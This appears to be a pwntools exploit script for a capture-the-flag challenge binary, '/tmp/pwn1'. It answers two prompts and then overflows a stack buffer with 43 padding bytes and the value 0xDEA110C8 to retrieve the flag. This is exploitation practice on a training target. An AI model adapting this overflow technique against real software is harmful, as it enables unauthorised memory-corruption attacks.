#!/usr/bin/python3

from pwn import *

#context.log_level = 'debug'
e = context.binary = ELF("/tmp/pwn1", checksec=False)
p = process()

payload = b"Sir Lancelot of Camelot"
p.sendlineafter(b" name?", payload)

payload = b"To seek the Holy Grail."
p.sendlineafter(b" quest?", payload)

padding = b'A'*43
payload = padding + p32(0xDEA110C8) 
p.sendlineafter(b" secret?", payload)

p.recvuntil(" go.\n")
flag = p.recvline()
p.recvall()

log.success("Flag: " + flag.decode())

#p.interactive()
